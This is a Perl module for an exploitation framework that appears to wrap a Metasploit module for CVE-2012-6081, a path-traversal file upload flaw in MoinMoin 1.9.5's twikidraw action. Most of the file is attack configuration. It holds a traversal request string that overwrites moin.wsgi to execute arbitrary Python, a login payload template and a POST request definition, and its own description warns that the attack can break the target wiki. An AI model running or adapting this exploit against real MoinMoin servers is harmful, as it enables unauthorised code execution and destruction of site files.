package MOINMOIN::MSF::MoinmoinTwikidraw;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MoinmoinTwikidraw";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2012-6081",
  DESCRIPTION => "

          This module exploits a vulnerability in MoinMoin 1.9.5. The vulnerability

        exists on the manage of the twikidraw actions, where a traversal path can be used

        in order to upload arbitrary files. Exploitation is achieved on Apached/mod_wsgi

        configurations by overwriting moin.wsgi, which allows to execute arbitrary python

        code, as exploited in the wild on July, 2012. This module is \"ManualRanking,\" and

        the user is warned to use this module at his own risk since it will overwrite the

        moin.wsgi file, required for the correct working of the MoinMoin wiki. While the

        exploit will try to restore the attacked application at post exploitation, successful

        restoration cannot be guaranteed.

      ",
  METHOD => "GET",
  MSF_MODULE => "moinmoin_twikidraw",
  OSVDB => 88825,
  PATH => "action=twikidraw&do=modify&target=../../../../moin.wsgi&action=twikidraw&do=save&ticket=__TICKET__&target=../../../../moin.wsgi&",
  PAYLOAD => "action=login&name=__NAME__&password=__PASSWORD__&login=Login&",
  REFERENCES => [
    "http://hg.moinmo.in/moin/1.9/rev/7e7e1cbb9d3f",
    "http://wiki.python.org/moin/WikiAttack2013",
  ],
  TITLE => "MoinMoin twikidraw Action Traversal File Upload",
  VARIABLES => {
    'TICKET' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'NAME' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'WikiSandBox',
      PAYLOAD      => 'action=login&name=__USERNAME__&password=__PASSWORD__&login=Login',
      TEXT   => 'Sending Exploit #1 Request : [POST] /WikiSandBox',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
